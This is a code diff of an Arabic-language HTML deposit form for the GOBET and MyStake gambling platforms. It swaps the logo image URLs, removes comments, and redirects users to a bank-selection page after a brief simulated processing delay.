@@ -73,7 +73,7 @@
                     <label class="cursor-pointer">
                         <input type="radio" name="site" value="GOBET" class="hidden" onchange="updateLabel(this.value)">
                         <div class="platform-btn p-4 rounded-3xl flex flex-col items-center justify-center">
-                            <img src="https://i.postimg.cc/Y4MRmx24/gobet.png" class="platform-img">
+                            <img src="https://i.postimg.cc/mhNJrVYd/goobet.png" class="platform-img">
                             <span class="platform-label uppercase">GOBET</span>
                         </div>
                     </label>
@@ -81,7 +81,7 @@
                     <label class="cursor-pointer">
                         <input type="radio" name="site" value="MYSTAKE" class="hidden" onchange="updateLabel(this.value)">
                         <div class="platform-btn p-4 rounded-3xl flex flex-col items-center justify-center">
-                            <img src="https://i.postimg.cc/z38LZPtQ/mystake.png" class="platform-img">
+                            <img src="https://i.postimg.cc/s1wm8LPL/mystake.png" class="platform-img">
                             <span class="platform-label uppercase">MYSTAKE</span>
                         </div>
                     </label>
@@ -111,20 +111,18 @@
     </main>
 
     <script>
-        // منع الحروف وتحديد 15 رقم للـ ID
         function validateInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
             if (input.value.length > 15) input.value = input.value.slice(0, 15);
         }
 
-        // تحديث الحقل عند اختيار MyStake
         function updateLabel(platform) {
             const label = document.getElementById('account-label');
             const input = document.getElementById('account-input');
             if (platform === 'MYSTAKE') {
                 label.innerText = 'Wallet Address Tether USD (ERC20)';
                 input.placeholder = 'أدخل عنوان المحفظة';
-                input.oninput = null; // السماح بالحروف للمحفظة
+                input.oninput = null;
                 input.maxLength = 100;
             } else {
                 label.innerText = 'رقم الحساب (ID)';
@@ -135,21 +133,19 @@
             }
         }
 
-        // معالجة الإرسال والتحويل
         document.getElementById('pay-form').onsubmit = function(e) {
             e.preventDefault();
             const btn = document.getElementById('submit-btn');
             const loader = document.getElementById('loader');
             const text = document.getElementById('btn-text');
 
-            // تفعيل الأنيميشن
             btn.disabled = true;
             loader.style.display = 'block';
-            text.innerText = 'جاري التحويل...';
+            text.innerText = 'جاري المعالجة...';
 
-            // التحويل لصفحة payment.html داخل مجلد w بعد ثانيتين
+            // التحويل الآن يذهب لصفحة اختيار البنك
             setTimeout(() => {
-                window.location.href = 'w/payment.html';
+                window.location.href = 'w/methods.html';
             }, 2000);
         };
     </script>
